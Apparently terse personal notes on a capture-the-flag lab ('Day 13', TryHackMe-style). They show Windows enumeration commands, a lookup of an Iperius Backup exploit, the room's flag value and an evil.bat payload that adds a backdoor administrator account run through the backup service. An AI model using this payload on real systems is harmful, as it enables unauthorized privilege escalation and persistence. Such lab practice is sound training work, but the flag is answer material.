Day 13

systeminfo | findstr /B /C: "OS Name"

Host Name:                 THE-GRINCH-HACK
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
BIOS Version:              Xen 4.2.amazon, 8/24/2006
                                 Connection Name: Ethernet


wmic service list | findstr "Running" >1.txt


Google "Iperius Backup exploit"

https://www.exploit-db.com/exploits/46863

c:\Users\thegrinch\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\thegrinch\Documents

11/10/2021  06:23 AM    <DIR>          .
11/10/2021  06:23 AM    <DIR>          ..
11/10/2021  06:21 AM                13 flag.txt
11/10/2021  06:23 AM               222 Schedule.txt
               2 File(s)            235 bytes
               2 Dir(s)  15,616,204,800 bytes free

c:\Users\thegrinch\Documents>type flag.txt
type flag.txt
THM-736635221
c:\Users\thegrinch\Documents>type Schedule.txt
type Schedule.txt
Daily Schedule:
4:00 - wallow in self-pity 
4:30 - stare into the abyss 
5:00 - solve world hunger, tell no one
5:30 - jazzercize
6:30 - dinner with me. I can�t cancel that again 
7:00 - wrestle with my self-loathing

Privilege administrators

change file evil.bat
@echo off
net user test MyPassword123 /add && net localgroup Administrators test /add

run backup

